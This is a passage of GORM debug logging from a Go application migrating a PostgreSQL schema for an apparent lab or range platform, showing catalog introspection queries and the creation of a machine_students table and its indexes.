[0m[33m[1.401ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'image_name_or_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.179ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'room_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.712ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'course_machine_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.500ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'operating_system_type_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.960ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND constraint_name = 'fk_machines_course_machine'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.887ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND constraint_name = 'fk_machines_operating_system_type'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.842ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND constraint_name = 'fk_machines_room'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.856ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'machines' AND indexname = 'idx_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.688ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[25.756ms] [34;1m[rows:0][0m CREATE TABLE "machine_students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"container_name_or_id" text NOT NULL,"done" boolean NOT NULL DEFAULT false,"student_id" bigint,"machine_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_machine_students_student" FOREIGN KEY ("student_id") REFERENCES "students"("id"),CONSTRAINT "fk_machine_students_machine" FOREIGN KEY ("machine_id") REFERENCES "machines"("id"))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.292ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_machine_students_deleted_at" ON "machine_students" ("deleted_at")

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.731ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.425ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.856ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.602ms] [34;1m[rows:-][0m SELECT * FROM "difficulty_levels" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.974ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.121ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.740ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'difficulty_levels'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.190ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.195ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.281ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.209ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.213ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'level') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.921ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'difficulty_levels' AND indexname = 'idx_difficulty_levels_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.753ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.424ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.737ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.666ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.418ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[28.912ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.527ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.139ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.008ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.042ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.039ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.008ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.131ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.042ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.043ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.121ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.042ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.045ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.036ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.020ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.045ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.739ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.565ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.318ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.254ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.022ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.964ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.258ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.433ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.951ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.036ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.060ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.028ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.007ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
